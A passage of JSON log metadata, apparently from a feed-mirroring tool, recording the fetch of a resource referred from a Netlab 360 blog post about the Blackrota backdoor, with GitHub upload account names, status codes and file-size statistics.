21:01:19","host":"europe66*","referer":"https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/","linkMd5ListStr":"c4b9c7fef53db13c0f9630cd43c4f35d","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"248.2 KB","destSize":"176.2 KB","compressRate":"71%"}],"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx15":1,"myreaderx10":1,"myreaderx3":1,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1},"failGithubMap":{"myreaderx23":1}}